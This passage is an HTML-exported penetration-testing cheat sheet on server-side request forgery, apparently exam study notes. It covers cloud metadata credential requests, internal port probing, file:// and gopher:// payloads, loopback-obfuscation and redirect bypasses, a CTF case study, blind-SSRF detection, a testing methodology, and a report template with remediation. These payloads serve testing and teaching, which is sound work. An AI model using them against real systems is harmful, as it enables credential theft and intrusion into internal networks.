+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_198982b9d8ca4761a9dcfea842a38a4b>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_198982b9d8ca4761a9dcfea842a38a4b=document.querySelector('button[name=btn_198982b9d8ca4761a9dcfea842a38a4b]');
+copyBtnbtn_198982b9d8ca4761a9dcfea842a38a4b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# AWS — IMDSv1 (no token required)\nGET /fetch?url=http://169.254.169.254/latest/meta-data/\nGET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\nGET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n# Returns: AccessKeyId, SecretAccessKey, Token\n\n# AWS — alternative addresses\nGET /fetch?url=http://[fd00:ec2::254]/latest/meta-data/   # IPv6\nGET /fetch?url=http://169.254.169.254/latest/user-data     # userdata often contains secrets\n\n# Azure\nGET /fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01\n# Requires: Metadata: true header — may need Burp to inject\n\n# GCP\nGET /fetch?url=http://metadata.google.internal/computeMetadata/v1/\nGET /fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\n# Requires: Metadata-Flavor: Google header\n`);copyBtnbtn_198982b9d8ca4761a9dcfea842a38a4b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_198982b9d8ca4761a9dcfea842a38a4b.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">AWS &#8212; IMDSv1 (no token required)
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://169.254.169.254/latest/meta-data/
+GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Returns: AccessKeyId, SecretAccessKey, Token
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">AWS &#8212; alternative addresses
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://[fd00:ec2::254]/latest/meta-data/   <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">IPv6
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://169.254.169.254/latest/user-data     <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">userdata often contains secrets
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Azure
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://169.254.169.254/metadata/instance?api-version=2021-02-01
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Requires: Metadata: true header &#8212; may need Burp to inject
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">GCP
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://metadata.google.internal/computeMetadata/v1/
+GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Requires: Metadata-Flavor: Google header</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orge318f40" class="outline-3">
+<h3 id="orge318f40">Internal Port Scanning</h3>
+<div class="outline-text-3" id="text-orge318f40">
+<p>
+Use SSRF to enumerate what is running on internal hosts. Infer
+open/closed from response time or error message differences.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3d79561fcd12492f9f92e9110f27ee0a>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_3d79561fcd12492f9f92e9110f27ee0a=document.querySelector('button[name=btn_3d79561fcd12492f9f92e9110f27ee0a]');
+copyBtnbtn_3d79561fcd12492f9f92e9110f27ee0a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Systematically probe ports — observe response differences\nGET /fetch?url=http://192.168.1.10:22    # SSH — connection refused vs timeout\nGET /fetch?url=http://192.168.1.10:80    # HTTP\nGET /fetch?url=http://192.168.1.10:443   # HTTPS\nGET /fetch?url=http://192.168.1.10:3306  # MySQL\nGET /fetch?url=http://192.168.1.10:5432  # PostgreSQL\n\n# Automate with Burp Intruder — payload list of ports\n# Cluster bomb: IP addresses × ports\n# Observe: response size, time, error message to distinguish open/closed\n`);copyBtnbtn_3d79561fcd12492f9f92e9110f27ee0a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3d79561fcd12492f9f92e9110f27ee0a.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Systematically probe ports &#8212; observe response differences
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://192.168.1.10:22    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">SSH &#8212; connection refused vs timeout
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://192.168.1.10:80    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">HTTP
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://192.168.1.10:443   <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">HTTPS
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://192.168.1.10:3306  <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">MySQL
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://192.168.1.10:5432  <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">PostgreSQL
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Automate with Burp Intruder &#8212; payload list of ports
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Cluster bomb: IP addresses &#215; ports
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Observe: response size, time, error message to distinguish open/closed</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org50ac193" class="outline-3">
+<h3 id="org50ac193">Alternative URL Schemes</h3>
+<div class="outline-text-3" id="text-org50ac193">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ffc99f9740d54f35af2cda89fafd25de>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_ffc99f9740d54f35af2cda89fafd25de=document.querySelector('button[name=btn_ffc99f9740d54f35af2cda89fafd25de]');
+copyBtnbtn_ffc99f9740d54f35af2cda89fafd25de.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# File read (if file:// not blocked)\nGET /fetch?url=file:///etc/passwd\nGET /fetch?url=file:///C:/Windows/win.ini\n\n# Gopher — send arbitrary TCP to non-HTTP services\n# Redis command via Gopher\nGET /fetch?url=gopher://127.0.0.1:6379/_*1%0D%0A$4%0D%0AINFO%0D%0A\n\n# Dict protocol — finger internal services\nGET /fetch?url=dict://127.0.0.1:6379/info\n`);copyBtnbtn_ffc99f9740d54f35af2cda89fafd25de.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ffc99f9740d54f35af2cda89fafd25de.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">File read (if file:// not blocked)
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=file:///etc/passwd
+GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=file:///C:/Windows/win.ini
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Gopher &#8212; send arbitrary TCP to non-HTTP services
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Redis command via Gopher
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=gopher://127.0.0.1:6379/_*1%0D%0A$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">4</span>%0D%0AINFO%0D%0A
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Dict protocol &#8212; finger internal services
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=dict://127.0.0.1:6379/info
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-org1d95392" class="outline-2">
+<h2 id="org1d95392">3. Bypass Techniques</h2>
+<div class="outline-text-2" id="text-org1d95392">
+<p>
+Applications often implement blocklists. Bypass attempts:
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_294e3f8e24a740d89e8ef64710496008>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_294e3f8e24a740d89e8ef64710496008=document.querySelector('button[name=btn_294e3f8e24a740d89e8ef64710496008]');
+copyBtnbtn_294e3f8e24a740d89e8ef64710496008.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Alternative representations of 127.0.0.1\nhttp://2130706433/           # decimal\nhttp://0x7f000001/           # hex\nhttp://0177.0.0.1/           # octal\nhttp://127.1/                # short form\nhttp://[::1]/                # IPv6 loopback\nhttp://[::]/ \n\n# DNS rebinding — point your domain to 127.0.0.1\nhttp://attacker.com/         # resolves to 127.0.0.1\n\n# URL encoding\nhttp://%31%32%37%2e%30%2e%30%2e%31/   # 127.0.0.1 encoded\n\n# Open redirect chaining\n# If app allows fetching from trusted domain that redirects:\nGET /fetch?url=https://trusted.com/redirect?to=http://169.254.169.254/\n\n# HTTPS bypass\nhttps://127.0.0.1/           # if only http:// is blocked\n\n# @ symbol trick\nhttp://expected.com@127.0.0.1/    # browser resolves to 127.0.0.1\n\n# Fragment trick\nhttp://127.0.0.1#expected.com\n`);copyBtnbtn_294e3f8e24a740d89e8ef64710496008.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_294e3f8e24a740d89e8ef64710496008.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Alternative representations of 127.0.0.1
+</span>http://2130706433/           <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">decimal
+</span>http://0x7f000001/           <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">hex
+</span>http://0177.0.0.1/           <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">octal
+</span>http://127.1/                <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">short form
+</span>http://[::1]/                <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">IPv6 loopback
+</span>http://[::]/ 
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">DNS rebinding &#8212; point your domain to 127.0.0.1
+</span>http://attacker.com/         <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">resolves to 127.0.0.1
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">URL encoding
+</span>http://%31%32%37%2e%30%2e%30%2e%31/   <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">127.0.0.1 encoded
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Open redirect chaining
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">If app allows fetching from trusted domain that redirects:
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=https://trusted.com/redirect?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">to</span>=http://169.254.169.254/
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">HTTPS bypass
+</span>https://127.0.0.1/           <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">if only http:// is blocked
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">@ symbol trick
+</span>http://expected.com@127.0.0.1/    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">browser resolves to 127.0.0.1
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Fragment trick
+</span>http://127.0.0.1#expected.com
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org73a8152" class="outline-2">
+<h2 id="org73a8152">4. SSRF as Access Control Bypass</h2>
+<div class="outline-text-2" id="text-org73a8152">
+<p>
+Not all SSRF impact comes from reaching services the attacker
+couldn't otherwise name — sometimes the allow-list is airtight
+and the exploit is elsewhere: many applications gate sensitive
+routes on <b>source IP</b> rather than authentication, trusting
+<code>127.0.0.1</code> or an internal CIDR as a proxy for authorization. If
+the same application (or any allow-listed hostname) can be coerced
+into requesting those routes, the outbound request genuinely
+originates from the trusted IP — the access control isn't broken
+in isolation, it's bypassed by a same-host service acting as the
+attacker's proxy.
+</p>
+
+<p>
+This is common even with a correctly-implemented hostname
+allow-list, if the allowed hostname itself resolves to loopback or
+an internal address (e.g. via <code>/etc/hosts</code> or internal DNS) — the
+allow-list was never a defence against this, since the "approved"
+target was internal by design.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_06d7d0a6eb654abe9f4edffb9518bb42>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_06d7d0a6eb654abe9f4edffb9518bb42=document.querySelector('button[name=btn_06d7d0a6eb654abe9f4edffb9518bb42]');
+copyBtnbtn_06d7d0a6eb654abe9f4edffb9518bb42.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Identify routes gated by source-IP checks (request.remote_addr,\n   X-Forwarded-For trust, or equivalent) rather than session/token\n   auth — these are candidates regardless of whether SSRF is\n   confirmed yet\n2. Identify any SSRF-capable parameter, even one restricted to an\n   allow-list of \"internal\" or \"approved\" hostnames\n3. Check what the allowed hostname(s) actually resolve to — an\n   allow-list entry that resolves to 127.0.0.1/internal range turns\n   the allow-list into free passage to the IP-gated routes\n4. Chain: request the SSRF-capable endpoint targeting the\n   allow-listed hostname, with a path pointing at the IP-gated\n   admin/internal route\n`);copyBtnbtn_06d7d0a6eb654abe9f4edffb9518bb42.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_06d7d0a6eb654abe9f4edffb9518bb42.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">1. Identify routes gated by source-IP checks (request.remote_addr,
+   X-Forwarded-For trust, or equivalent) rather than session/token
+   auth &#8212; these are candidates regardless of whether SSRF is
+   confirmed yet
+2. Identify any SSRF-capable parameter, even one restricted to an
+   allow-list of "internal" or "approved" hostnames
+3. Check what the allowed hostname(s) actually resolve to &#8212; an
+   allow-list entry that resolves to 127.0.0.1/internal range turns
+   the allow-list into free passage to the IP-gated routes
+4. Chain: request the SSRF-capable endpoint targeting the
+   allow-listed hostname, with a path pointing at the IP-gated
+   admin/internal route
+</pre>
+</div></div>
+
+<p>
+Classify this as SSRF (the root cause and exploitation mechanism),
+noting the access-control-bypass impact in the description rather
+than reclassifying as Broken Access Control — the vulnerable
+component is the unauthenticated outbound fetch, not the IP check
+itself, which behaved as designed.
+</p>
+</div>
+<div id="outline-container-orgaf6d5dd" class="outline-3">
+<h3 id="orgaf6d5dd">Case study — Operation Coldstart CTF</h3>
+<div class="outline-text-3" id="text-orgaf6d5dd">
+<p>
+A URL-preview app allow-listed a single "approved internal
+hostname" that resolved to <code>127.0.0.1</code> via <code>/etc/hosts</code>. A separate
+admin route was gated purely on <code>request.remote_addr</code> starting with
+<code>127.</code>. Requesting the preview endpoint with the allow-listed
+hostname and the admin route's path as target caused the app to
+fetch its own admin endpoint, satisfying the IP check and returning
+gated content (credentials) in the preview response.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_ff1bbcae284144bdbc57914c0d8eaf7c>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_ff1bbcae284144bdbc57914c0d8eaf7c=document.querySelector('button[name=btn_ff1bbcae284144bdbc57914c0d8eaf7c]');
+copyBtnbtn_ff1bbcae284144bdbc57914c0d8eaf7c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`http://target/preview?url=http://<allowlisted-host>/admin/notes\n`);copyBtnbtn_ff1bbcae284144bdbc57914c0d8eaf7c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ff1bbcae284144bdbc57914c0d8eaf7c.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">http://target/preview?url=http://&lt;allowlisted-host&gt;/admin/notes
+</pre>
+</div></div>
+
+<p>
+See <a href="../org/pentest/20260712T205856--operation-coldstart__ctf.html">denote:20260712T205856</a> for the full chain.
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-org4b46ccb" class="outline-2">
+<h2 id="org4b46ccb">5. Blind SSRF</h2>
+<div class="outline-text-2" id="text-org4b46ccb">
+<p>
+The server makes the request but the response is not returned.
+Use out-of-band detection.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8bff1aa8f4024ea7a2faec29b90beb75>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_8bff1aa8f4024ea7a2faec29b90beb75=document.querySelector('button[name=btn_8bff1aa8f4024ea7a2faec29b90beb75]');
+copyBtnbtn_8bff1aa8f4024ea7a2faec29b90beb75.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Burp Collaborator — generate a payload URL\n# Insert into SSRF parameter — if Collaborator receives a request,\n# the parameter is being fetched server-side\n\n# Interactsh (open source Collaborator alternative)\n# https://github.com/projectdiscovery/interactsh\ninteractsh-client                    # generates *.oast.fun domain\nGET /fetch?url=http://<id>.oast.fun  # if DNS/HTTP hit received = SSRF confirmed\n\n# Time-based detection\n# Open port → faster response\n# Closed port → connection refused immediately\n# Filtered/no route → timeout (much slower)\n# Measure response times to infer internal network state\n`);copyBtnbtn_8bff1aa8f4024ea7a2faec29b90beb75.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8bff1aa8f4024ea7a2faec29b90beb75.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Burp Collaborator &#8212; generate a payload URL
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Insert into SSRF parameter &#8212; if Collaborator receives a request,
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">the parameter is being fetched server-side
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Interactsh (open source Collaborator alternative)
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">https://github.com/projectdiscovery/interactsh
+</span>interactsh-client                    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">generates *.oast.fun domain
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://&lt;id&gt;.oast.fun  <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">if DNS/HTTP hit received = SSRF confirmed
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Time-based detection
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Open port &#8594; faster response
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Closed port &#8594; connection refused immediately
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Filtered/no route &#8594; timeout (much slower)
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Measure response times to infer internal network state</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org89ae20a" class="outline-2">
+<h2 id="org89ae20a">6. Testing Methodology</h2>
+<div class="outline-text-2" id="text-org89ae20a">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_24b7d52f965c4ac7acf5ccffc0e7a987>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_24b7d52f965c4ac7acf5ccffc0e7a987=document.querySelector('button[name=btn_24b7d52f965c4ac7acf5ccffc0e7a987]');
+copyBtnbtn_24b7d52f965c4ac7acf5ccffc0e7a987.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Map all parameters that accept URLs, hostnames, or IPs\n2. Test with http://127.0.0.1 — confirm basic SSRF\n3. Test cloud metadata endpoint (169.254.169.254)\n4. Probe common internal ports on 127.0.0.1 and RFC1918 ranges\n5. Attempt alternative URL schemes: file://, gopher://, dict://\n6. If blocked: work through bypass list in section 3\n7. If no response returned: use Burp Collaborator / Interactsh\n8. Check whether any allow-listed/approved hostname resolves to\n loopback or an internal range — if so, treat it as a direct\n path to any IP-gated internal route, not just a narrower SSRF\n9. Document the request, response, and impact for the report\n`);copyBtnbtn_24b7d52f965c4ac7acf5ccffc0e7a987.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_24b7d52f965c4ac7acf5ccffc0e7a987.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">1. Map all parameters that accept URLs, hostnames, or IPs
+2. Test with http://127.0.0.1 &#8212; confirm basic SSRF
+3. Test cloud metadata endpoint (169.254.169.254)
+4. Probe common internal ports on 127.0.0.1 and RFC1918 ranges
+5. Attempt alternative URL schemes: file://, gopher://, dict://
+6. If blocked: work through bypass list in section 3
+7. If no response returned: use Burp Collaborator / Interactsh
+8. Check whether any allow-listed/approved hostname resolves to
+ loopback or an internal range &#8212; if so, treat it as a direct
+ path to any IP-gated internal route, not just a narrower SSRF
+9. Document the request, response, and impact for the report
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org8ecfab1" class="outline-2">
+<h2 id="org8ecfab1">7. Reporting Template</h2>
+<div class="outline-text-2" id="text-org8ecfab1">
+<p>
+<b>Classification:</b> Server-Side Request Forgery (SSRF)
+</p>
+
+<p>
+<b>Severity:</b> High (internal service access) /
+             Critical (cloud metadata credential theft)
+</p>
+
+<p>
+<b>Description:</b>
+The <code>url</code> parameter at <code>[endpoint]</code> is passed to a server-side
+HTTP client without validation. An attacker can supply an
+arbitrary URL causing the server to make requests to internal
+services or cloud metadata endpoints not accessible externally.
+</p>
+
+<p>
+<b>Evidence:</b>
+</p>
+<pre class="example" id="org2a72baa">
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role HTTP/1.1
+Host: target.com
+
+HTTP/1.1 200 OK
+{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
+</pre>
+
+<p>
+<b>Remediation:</b>
+</p>
+<ul class="org-ul">
+<li>Validate and allowlist permitted URLs server-side</li>
+<li>Block requests to RFC1918 ranges and loopback addresses</li>
+<li>Disable unused URL schemes (<a href="file://">file://</a>, gopher://, dict://)</li>
+<li>On cloud infrastructure, enforce IMDSv2 (token-required)</li>
+<li>Implement network-level controls preventing the web server
+from making arbitrary outbound connections</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org1529e20" class="outline-2">
+<h2 id="org1529e20">Tips</h2>
+<div class="outline-text-2" id="text-org1529e20">
+<ul class="org-ul">
+<li>Always test 169.254.169.254 on any SSRF — cloud credential
+theft is the highest-impact outcome and takes one request</li>
+<li>Response time differences are your primary signal for blind
+SSRF internal port scanning — script it rather than doing it
+manually</li>
+<li>The <code>@</code> and <code>#</code> URL tricks catch a surprising number of naive
+blocklists — try them before concluding the parameter is safe</li>
+<li>Gopher is powerful but increasingly blocked — try it after
+confirming basic HTTP SSRF works</li>
+<li>On the exam: SSRF is classified as SSRF regardless of what
+the server ultimately accesses</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script type="text/javascript">
+<!--/*--><![CDATA[/*><!--*/
+if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
+document.cookie = 'mode=dark'
+}
+document.cookie = 'light=modus-operandi-tinted'
+document.cookie = 'dark=modus-vivendi-tinted'
+/*
+;; nice-org-html.js
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+;; JS for html exported by et-org-html.el
+ */
+
+const preamble = document.getElementById("preamble");
+const content = document.getElementById("content");
+const postamble = document.getElementById("postamble");
+
+const controls = document.getElementById("view-controls");
+const toggleTocBtn = document.getElementById("toggle-toc");
+const gotoTopBtn = document.getElementById("goto-top");
+const toggleModeBtn = document.getElementById("toggle-mode");
